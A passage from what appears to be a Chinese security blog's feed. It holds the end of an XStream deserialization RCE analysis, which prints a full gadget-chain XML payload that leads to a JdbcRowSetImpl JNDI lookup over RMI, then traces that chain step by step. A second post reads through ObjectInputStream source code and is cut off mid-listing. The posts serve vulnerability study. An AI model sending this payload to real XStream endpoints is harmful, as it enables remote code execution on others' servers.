class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XRTreeFrag'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">'../fConfigSetInput'</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p><code>&lt;sorted-set&gt;</code>是最外层的对象，内部包含着两个<code>javax.naming.ldap.Rdn$RdnEntry</code>成员。</p><p>那么在第二个<code>RdnEntry</code>成员加入到<code>sorted-set</code>的时候，会调用<code>Rdn$RdnEntry.compareTo</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809182816307.png" alt="image-20210809182816307" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183547832.png" alt="image-20210809183547832" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183614947.png" alt="image-20210809183614947" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183210279.png" alt="image-20210809183210279" style="zoom:50%;"><p>这里<code>m_DTMXRTreeFrag.getDTM()</code>实际上获取<code>SAX2DTM</code>对象，之后调用<code>SAX2DTM#getStringvalue</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184332065.png" alt="image-20210809184332065" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184400149.png" alt="image-20210809184400149" style="zoom:50%;"><p>来到<code>nextNode()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184459982.png" alt="image-20210809184459982" style="zoom:50%;"><p>该方法中调用了<code>m_incrementalSAXSource</code>属性也就是POC中封装好的<code>IncrementalSAXSource_Xerces</code>对象的<code>deliverMoreNodes</code>方法。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184632899.png" alt="image-20210809184632899" style="zoom:50%;"><p>接下来分别执行：<code>IncrementalSAXSource_Xerces.java:312</code> 来到<code>IncrementalSAXSource_Xerces.parseSome</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184856456.png" alt="image-20210809184856456" style="zoom:50%;"><p>其中这里<code>fConfigParse</code>、<code>fPullParserConfig</code>、<code>parmsfalse</code> 都可控，之后该方法会通过反射调用JdbcRowSetImpl.setAutoCommit方法，结合JdbcRowSetImpl攻击。 </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener"> XStream源码解析</a></p><p><a href="https://www.cnblogs.com/v1ntlyn/p/14034019.html" target="_blank" rel="noopener">1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;百川东到海，何时复西归？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一篇来梳理XStream不同版本RCE，也会是补全计划的一部分。    &lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="XStream" scheme="https://fynch3r.github.io/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化流程梳理</title>
    <link href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-17T03:24:19.000Z</published>
    <updated>2021-12-05T10:03:26.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>梳理Java反序列化流程。</p><p>参考<a href="https://www.cnpanda.net/" target="_blank" rel="noopener">panda</a>师傅。</p><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>有了前两篇<a href="https://0range228.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/" target="_blank" rel="noopener">序列化协议</a>、<a href="https://0range228.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/" target="_blank" rel="noopener">序列化流程梳理</a>作为学习基础，反序列化操作就好理解多了。</p><p>我们知道序列化的核心原理：</p><blockquote><p>创建一个ObjectOutputStream输出流，调用</p><p>流对象的writeObject方法，将对象序列化保存。</p></blockquote><p>那么其实反序列化就是对称的：</p><blockquote><p>创建一个ObjectInputStream输入流，调用ois流对象的readObject方法，将内容还原为内存中的对象。</p></blockquote><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><p>老规矩 还是先上demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">        Student o = (Student)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心还是两句话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">Student o = (Student)ois.readObject();</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>看<code>ObjectInputStream</code>的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        verifySubclass();</span><br><span class="line">        bin = <span class="keyword">new</span> BlockDataInputStream(in);</span><br><span class="line">        handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>);</span><br><span class="line">        vlist = <span class="keyword">new</span> ValidationList();</span><br><span class="line">        serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line">        enableOverride = <span class="keyword">false</span>;</span><br><span class="line">        readStreamHeader();</span><br><span class="line">        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和序列化一样，同样先是<code>verifySubclass()</code>查看是否可以在不违反安全约束的情况下构造此实例。</p><p>四个全局变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** filter stream for handling block data conversion */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataInputStream bin;</span><br><span class="line"><span class="comment">/** validation callback list */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ValidationList vlist;</span><br><span class="line"><span class="comment">/** wire handle -&gt; obj/exception map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> HandleTable handles;</span><br><span class="line"><span class="comment">/** if true, invoke readObjectOverride() instead of readObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> enableOverride;</span><br></pre></td></tr></table></figure><p>在oos里面的bout，ois里面则是bin，作用是对称的。</p><p>比较特殊的是：</p><p><code>visit</code>是一个用来提供<code>CallBack</code>操作的验证集合</p><p>几个全局变量初始化之后：</p><p><code>readStreamHeader();</code>：读取序列化文件的头部，验证魔数和序列化版本是否匹配</p><p><code>bin.setBlockDataMode(true);</code>：设置为块数据读取模式</p><h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><p>当public构造函数执行完毕之后，就该执行<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">    <span class="keyword">int</span> outerHandle = passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object obj = readObject0(<span class="keyword">false</span>);</span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line">        ClassNotFoundException ex = handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，也是把主要操作交给了<strong>readObject</strong>方法来完成。</p><h3 id="readObject0"><a href="#readObject0" class="headerlink" title="readObject0"></a>readObject0</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Underlying readObject implementation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> oldMode = bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="keyword">int</span> remain = bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Fix for 4360508: stream is currently at the end of a field</span></span><br><span class="line"><span class="comment">             * value block written via default serialization; since there</span></span><br><span class="line"><span class="comment">             * is no terminating TC_ENDBLOCKDATA tag, simulate</span></span><br><span class="line"><span class="comment">             * end-of-custom-data behavior explicitly.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> tc;</span><br><span class="line">    <span class="comment">//从序列化信息中获取第一个字节</span></span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    totalObjectRefs++;</span><br><span class="line">    <span class="comment">// 如果是对象的序列化，tc=0x73,也就是TC_OBJECT，</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE: <span class="comment">// handle</span></span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT: <span class="comment">// Object</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                IOException ex = readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> WriteAbortedException(<span class="string">"writing aborted"</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                    <span class="keyword">throw</span> <span 